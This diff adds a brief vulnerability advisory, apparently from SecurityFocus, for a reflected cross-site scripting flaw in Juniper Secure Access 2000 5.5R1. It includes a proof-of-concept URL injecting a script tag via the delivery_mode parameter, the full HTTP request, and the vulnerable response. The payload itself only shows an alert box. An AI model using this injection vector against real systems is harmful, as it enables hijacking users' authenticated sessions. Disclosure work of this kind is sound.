@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/28034/info
+
+Juniper Networks Secure Access 2000 is prone to a cross-site scripting vulnerability because it fails to adequately sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Juniper Networks Secure Access 2000 5.5R1 Build 11711 is vulnerable; other versions may also be affected. 
+
+https://www.example.com/dana-na/auth/rdremediate.cgi?delivery_mode=</APPLET><SCRIPT>alert(&#039;Can%20Cross%20Site%20Attack&#039;)</SCRIPT>&action=tryagain&signinId=url_default
+
+COMPLETE HTTP REQUEST:
+
+GET
+/dana-na/auth/rdremediate.cgi?delivery_mode=</APPLET><SCRIPT>alert(&#039;Can%20Cross%20Site%20Attack&#039;)</SCRIPT>&action=tryagain&signinId=url_default
+HTTP/1.1
+User-Agent: curl/7.15.4 (i486-pc-linux-gnu) libcurl/7.15.4
+OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.3
+Host: target-domain.foo
+Accept: */*
+[CRLF]
+[CRLF]
+
+
+PARTIAL HTTP RESPONSE:
+
+<title></title>
+
+[SNIP]
+
+<APPLET id=NeoterisSetup > Unknown deliver mode
+</APPLET><SCRIPT>alert(&#039;Can Cross Site Attack&#039;)</SCRIPT>
+<PARAM NAME="Parameter0" VALUE="action=tryagain"></APPLET>
